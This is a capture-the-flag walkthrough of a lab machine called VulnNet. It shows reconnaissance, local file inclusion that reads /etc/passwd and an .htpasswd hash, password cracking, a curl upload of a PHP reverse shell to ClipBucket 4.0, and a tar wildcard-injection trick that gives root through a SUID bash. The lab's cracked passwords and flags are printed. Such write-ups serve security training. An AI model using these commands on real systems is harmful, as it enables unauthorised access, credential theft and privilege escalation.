**Initial Reconnaissance**
We add the target domain to /etc/hosts to resolve it locally.

Added domain to `/etc/hosts`:
```
10.67.148.153    vulnnet.thm 
```

**Nmap Scan**
We scan open ports and services. Ports 22 (SSH) and 80 (HTTP) are open.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.29
```

**Web Enumeration with Gobuster**
We brute-force directories and files. We find /js
```
/index.php            (Status: 200)
/login.html           (Status: 200)
/img                  (Status: 301)
/css                  (Status: 301)
/js                   (Status: 301)
/LICENSE.txt          (Status: 200)
```

**JS Analysis**  
Inspecting JavaScript files reveals two hidden links: one leading to an LFI vector and another to a subdomain.
```
"http://vulnnet.thm/index.php?referer="
"http://broadcast.vulnnet.thm"
```

**LFI in referer**
The referer parameter is vulnerable to Local File Inclusion. We read /etc/passwd and discover users root and server-management.
```
http://vulnnet.thm/index.php?referer=/etc/passwd
```
Found users: `root` and `server-management`

**Finding Credentials**
Using LFI, we access /etc/apache2/.htpasswd and extract a hash for user developers.
```
http://vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd

developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

**Cracking with John**
We crack the hash with John the Ripper and obtain the password: 9972761drmfsls.
```
developers:9972761drmfsls
```

**Accessing ClipBucket**  
The credentials work on broadcast.vulnnet.thm, where ClipBucket version 4.0 is running.
```
Credentials work on `http://broadcast.vulnnet.thm`  
Version: ClipBucket 4.0
```
![ClipBucket Login](Pasted%20image%2020260314183105.png)

**Exploiting ClipBucket
We find a public exploit for ClipBucket 4.0 and upload a PHP reverse shell using the beats_uploader.php endpoint.

looking on searchsploit

![Searchsploit](Pasted%20image%2020260314183517.png)
```
curl -u developers:9972761drmfsls -F "file=@shell.php" -F "plupload=1" -F "name=shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
```
Got filename: `17734719245571d8`

**Reverse Shell**
We catch the shell with a Netcat listener and gain access as www-data.
```
nc -lvnp 4444
```
 
```
www-data@vulnnet:/var/www/html/api$
```

**Internal Enumeration**
We find a backup file containing an SSH private key for user server-management.
```
cp /var/backups/ssh-backup.tar.gz /tmp/
tar -xzvf ssh-backup.tar.gz
```

**Cracking SSH Key**
The SSH key is password-protected. We crack it with John and get the passphrase: oneTWO3gOyac.
```
john id_rsa.key
Password: oneTWO3gOyac
```

**SSH Access**
We log in as server-management and capture the user flag.
```bash

ssh -i id_rsa server-management@broadcast.vulnnet.thm
server-management@vulnnet:~$ cat user.txt
THM{907e420d979d8e2992f3d7e16bee1e8b}
```
**Privilege Escalation**  

A root cronjob runs a backup script that uses tar * in /home/server-management/Documents, which is vulnerable to wildcard injection.
```
*/2 * * * * root /var/opt/backupsrv.sh

```

The script uses tar * in /home/server-management/Documents → wildcard vulnerability
```
www-data@vulnnet:/var/www/html/api$ cat /var/opt/backupsrv.sh      
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest

```

**Exploitation**
 wild card * vulnerability
```
cd /home/server-management/Documents
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/bash' > shell.sh
echo 'chmod +s /bin/bash' >> shell.sh
chmod +x shell.sh
```

**Root**
```
/bin/bash -p
bash-4.4# cat /root/root.txt
THM{220b671dd8adc301b34c2738ee8295ba}
```
